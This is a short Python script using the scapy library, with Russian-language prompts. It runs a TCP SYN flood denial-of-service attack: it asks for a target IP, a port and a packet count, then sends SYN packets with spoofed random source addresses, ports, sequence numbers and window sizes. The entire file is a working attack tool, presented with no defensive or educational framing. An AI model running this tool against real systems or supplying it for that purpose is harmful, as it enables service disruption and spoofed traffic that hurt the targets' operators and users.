# -*- coding: cp1251 -*-
from scapy.all import *
import os
import sys
import random

def randomIP():
    ip = ".".join([str(random.randint(0, 255)) for _ in range(4)])
    return ip

def randInt():
    return random.randint(0, 255)

def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    print("Packets are sending ...")
    for x in range(counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP(src=randomIP(), dst=dstIP)
        TCP_Packet = TCP(sport=s_port, dport=dstPort, flags="S", seq=s_eq, window=w_indow)

        send(IP_Packet/TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)

def info():
    dstIP = input("IP")
    dstPort = int(input("Порт"))
    return dstIP, dstPort

def main():
    dstIP, dstPort = info()
    counter = int(input("Количество пакетов: "))
    SYN_Flood(dstIP, dstPort, counter)

if __name__ == "__main__":
    main()